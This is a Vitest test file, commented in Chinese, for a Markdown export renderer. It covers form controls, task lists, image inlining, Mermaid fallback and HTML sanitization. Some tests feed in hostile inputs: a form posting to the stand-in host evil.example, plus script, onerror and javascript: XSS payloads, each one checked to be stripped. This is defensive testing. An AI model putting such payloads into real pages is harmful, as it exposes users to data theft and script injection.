/**
 * 导出渲染管线的守卫（jsdom：DOMPurify 需要 DOM）。
 *
 * 重点钉三件「本地跑得通、别人电脑上就废」的事：
 * ① 本地图片必须真的变成 data: —— 盘符路径会被消毒层剥掉 src（见 markLocalImages 注释）；
 * ② 预览的装饰（复制按钮/块号）不能出现在导出里；
 * ③ 表单能往外 POST 的属性必须剥掉，否则笔记变成钓鱼页。
 *
 * 每条都做过防假绿核对，见文件末尾注释。
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import { invoke } from "@tauri-apps/api/core";

// mermaid 是真包 + 真渲染，单元测试里既慢又依赖布局；这里只验证「替换链路」，
// 所以钉死一个 svg 出来即可
vi.mock("mermaid", () => ({
  default: {
    initialize: vi.fn(),
    render: vi.fn().mockResolvedValue({ svg: "<svg id=\"mmd\"></svg>" }),
  },
}));

import { renderMarkdownForExport } from "@/lib/markdown/exportRender";

const B64 = Buffer.from("fake-png-bytes").toString("base64");

beforeEach(() => {
  vi.mocked(invoke).mockReset();
});

describe("renderMarkdownForExport —— 正文与表单", () => {
  it("基础正文能渲染，语法糖 {{}} 变成可填控件并登记为字段", async () => {
    const r = await renderMarkdownForExport("# 标题\n\n姓名：{{姓名}}\n\n备注：{{备注/多行}}");
    expect(r.html).toContain("<h1");
    expect(r.html).toContain(`<input class="md-fill" type="text" name="姓名"`);
    expect(r.html).toContain(`<textarea class="md-fill md-fill-area" name="备注"`);
    expect(r.fields.map((f) => f.name)).toEqual(["姓名", "备注"]);
  });

  it("下拉语法糖生成 select + 选项", async () => {
    const r = await renderMarkdownForExport("状态：{{状态|待处理|已完成}}");
    expect(r.html).toContain("<select");
    expect(r.html).toContain("<option value=\"待处理\">待处理</option>");
    expect(r.fields[0].kind).toBe("select");
  });

  it("任务列表勾选框不算字段，也不禁用（勾选由内嵌运行时记在本机）", async () => {
    const r = await renderMarkdownForExport("- [ ] 未做的事\n- [x] 已完成");
    expect(r.fields).toEqual([]);
    expect(r.taskCount).toBe(2);
    expect(r.html).not.toContain("__f0");
    // 编号按文档顺序，运行时靠它对上"哪一项被勾了"
    expect(r.html).toContain('data-pp-task="0"');
    expect(r.html).toContain('data-pp-task="1"');
    // 早期实现硬编码 disabled，理由是「没有写回通道」——现在有通道了，禁掉就是假交互
    expect(r.html).not.toContain("disabled");
  });

  it("任务框编号不受表单字段影响（两者各走各的序号空间）", async () => {
    const r = await renderMarkdownForExport(
      "姓名：{{姓名}}\n\n- [ ] 一\n- [ ] 二\n\n备注：{{备注/多行}}\n\n- [x] 三",
    );
    expect(r.fields.map((f) => f.name)).toEqual(["姓名", "备注"]);
    expect(r.taskCount).toBe(3);
    expect(r.html.match(/data-pp-task="(\d+)"/g)).toEqual([
      'data-pp-task="0"',
      'data-pp-task="1"',
      'data-pp-task="2"',
    ]);
  });

  it("裸 HTML 表单控件也保留，缺 name 的按序补齐", async () => {
    const r = await renderMarkdownForExport("签名：<input type=\"text\" placeholder=\"姓名\">");
    expect(r.html).toMatch(/<input[^>]*name="__f0"/);
    expect(r.fields[0].label).toBe("姓名");
  });

  it("不含预览装饰（复制按钮 / 块号）—— 导出的页面没有那条点击通道", async () => {
    const r = await renderMarkdownForExport("# A\n\n```js\nlet a=1;\n```\n\n第二段");
    expect(r.html).not.toContain("md-copybtn");
    expect(r.html).not.toContain("md-blknum");
    expect(r.html).not.toContain("md-tblcopy");
    expect(r.html).not.toContain("md-tblwrap");
  });

  it("<form action> / method / formaction 被剥掉（否则笔记能往外发数据）", async () => {
    const r = await renderMarkdownForExport(
      "<form action=\"https://evil.example/x\" method=\"post\"><input name=\"a\">" +
        "<button formaction=\"https://evil.example/y\">提交</button></form>",
    );
    expect(r.html).not.toContain("evil.example");
    expect(r.html).not.toContain("formaction");
  });

  it("脚本与事件属性被剥掉", async () => {
    const r = await renderMarkdownForExport(
      "<script>alert(1)</script><img src=x onerror=\"alert(2)\"><a href=\"javascript:alert(3)\">x</a>",
    );
    expect(r.html).not.toContain("alert(1)");
    expect(r.html).not.toContain("onerror");
    expect(r.html).not.toContain("javascript:");
  });

  it("空/无内容文档返回空串并给出提示", async () => {
    const r = await renderMarkdownForExport("");
    expect(r.html.trim()).toBe("");
    expect(r.warnings.length).toBeGreaterThan(0);
  });

  // 🔴 导出实例必须与预览同 breaks 口径：预览（renderHtml 全局 marked）是 breaks:true，
  // 导出实例漏配会把正文里的单换行合并成一行——「预览什么样、导出什么样」直接破约。
  it("段落内单换行导出为 <br>（与预览 breaks:true 同口径）", async () => {
    const r = await renderMarkdownForExport("第一行\n第二行");
    expect(r.html).toContain("<br>");
  });
});

describe("renderMarkdownForExport —— 图片内联", () => {
  it("Windows 盘符路径能穿过消毒层变成 data:（不转占位的话 src 会被整段剥掉）", async () => {
    vi.mocked(invoke).mockResolvedValue(B64);
    const r = await renderMarkdownForExport("![](C:/Users/x/a.png)");
    expect(r.html).toContain(`src="data:image/png;base64,${B64}"`);
    expect(r.warnings).toEqual([]);
  });

  it("相对路径按 baseDir 解析后内联", async () => {
    vi.mocked(invoke).mockResolvedValue(B64);
    const r = await renderMarkdownForExport("![](./assets/b.jpg)", { baseDir: "D:/docs" });
    expect(r.html).toContain("data:image/jpeg;base64,");
    expect(vi.mocked(invoke).mock.calls[0][1]).toEqual({ path: "D:/docs/assets/b.jpg" });
  });

  it("读取失败退回原 src 并给提示（至少让人看出是哪张图）", async () => {
    vi.mocked(invoke).mockRejectedValue(new Error("ENOENT"));
    const r = await renderMarkdownForExport("![](C:/Users/x/missing.png)");
    expect(r.html).toContain("C:/Users/x/missing.png");
    expect(r.warnings[0]).toContain("图片读取失败");
  });

  it("网络图片保持外链（内联它等于允许外部请求 + 追踪像素）", async () => {
    const r = await renderMarkdownForExport("![](https://example.com/a.png)");
    expect(r.html).toContain("https://example.com/a.png");
    expect(vi.mocked(invoke)).not.toHaveBeenCalled();
  });

  it("不支持的扩展名不强转（宁可留原路径也不产出坏 data:）", async () => {
    vi.mocked(invoke).mockResolvedValue(B64);
    const r = await renderMarkdownForExport("![](C:/Users/x/a.tiff)");
    expect(r.html).not.toContain("data:");
    expect(vi.mocked(invoke)).not.toHaveBeenCalled();
  });
});

describe("renderMarkdownForExport —— 代码块与流程图", () => {
  it("代码块带上语言标签，不出现预览专属的包装类", async () => {
    const r = await renderMarkdownForExport("```js\nconst a = 1;\n```");
    expect(r.html).toContain("md-codehead");
    expect(r.html).toContain("md-langtab");
    expect(r.html).toContain("js");
  });

  it("mermaid 块被替换成 svg；渲染失败则退化成源码块并给提示", async () => {
    const r = await renderMarkdownForExport("```mermaid\ngraph TD;A-->B;\n```");
    expect(r.html).toContain("<svg id=\"mmd\"></svg>");
    expect(r.html).not.toContain("data-pp-mmd");

    const mermaid = (await import("mermaid")).default;
    vi.mocked(mermaid.render).mockRejectedValueOnce(new Error("bad graph"));
    const bad = await renderMarkdownForExport("```mermaid\nclassDiagram\n```");
    expect(bad.html).toContain("md-mermaid-error");
    expect(bad.warnings.some((w) => w.includes("图表"))).toBe(true);
  });

  it("没有代码块时不加载高亮器（懒加载的意义）", async () => {
    const r = await renderMarkdownForExport("只是普通段落");
    expect(r.warnings).toEqual([]);
    expect(r.html).toContain("<p>");
  });

  // 🔴 mermaid 占位替换必须用函数替换：字符串 replacement 会把 `$&`/`$'`/`` $` ``
  // 当 Replace Pattern 解释——失败保留源码的分支里源码本身进了 replacement，
  // 标签含这类序列时导出产物被确定性改写（`$'` 还会大段复制匹配点之后的全文）。
  // 断言口径：escapeHtml 把 `&` 转成 `&amp;`，但 `$` 不转义——`$&amp;` 在输出里
  // 原样出现即证明 `$&` 没被 Replace Pattern 吃掉。
  it("渲染失败保留源码时，源码里的 $& 与 $' 原样出现", async () => {
    const mermaid = (await import("mermaid")).default;
    vi.mocked(mermaid.render).mockRejectedValueOnce(new Error("bad graph"));
    const r = await renderMarkdownForExport("```mermaid\ngraph TD\nA[价格$&税费]-->B[5$'s]\n```");
    expect(r.html).toContain("$&amp;税费");
    expect(r.html).toContain("5$'s");
    expect(r.warnings.some((w) => w.includes("图表"))).toBe(true);
  });
});
